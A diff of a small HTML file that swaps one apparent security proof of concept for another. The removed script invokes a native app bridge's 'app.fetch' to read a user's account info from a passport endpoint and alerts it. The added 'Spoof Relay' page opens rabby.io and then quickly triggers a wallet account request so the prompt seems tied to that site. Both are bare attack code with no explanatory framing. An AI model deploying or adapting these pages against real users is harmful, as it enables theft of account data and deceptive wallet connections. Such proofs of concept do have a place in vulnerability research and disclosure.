@@ -1,28 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Spoof Relay</title>
+</head>
 <body>
-    <h>test</h>
-
-    <script>
-    window.JSBridge = {
-  _handleMessageFromApp(r) {
-    alert(JSON.stringify(r.__params.data));
-  },
-};
-JS2NativeBridge._invokeMethod(
-  JSON.stringify({
-    func: "app.fetch",
-    __callback_id: "1000",
-    JSSDK: 0,
-    __msg_type: "",
-    params: {
-      url: "https://is.snssdk.com/passport/account/info/v2",
-      needCommonParams: true,
-      method: "GET",
-    },
-    namespace: "",
-    currentUrl: "",
-  })
-);
-
-</script>
+  <h2>Connecting Wallet…</h2>
+  <p id="msg">Please click the button to connect.</p>
+  <button id="connectBtn">Connect Wallet</button>
+  <script>
+    document.getElementById('connectBtn').addEventListener('click', async () => {
+      if (!window.ethereum) {
+        document.getElementById('msg').innerText = 'No wallet installed!';
+        return;
+      }
+      try {
+        window.open('https://rabby.io');
+        setTimeout(async () => {
+          const accountsPromise = window.ethereum.request({
+            method: 'eth_requestAccounts'
+          });
+          try {
+            const accounts = await accountsPromise;
+            document.getElementById('msg').innerText =
+              'Connected: ' + accounts[0];
+          } catch (err) {
+            document.getElementById('msg').innerText = 'Connection failed';
+            console.error(err);
+          }
+        }, 100);
+      } catch (err) {
+        document.getElementById('msg').innerText = 'Unexpected error';
+        console.error(err);
+      }
+    });
+  </script>
 </body>
-
+</html>
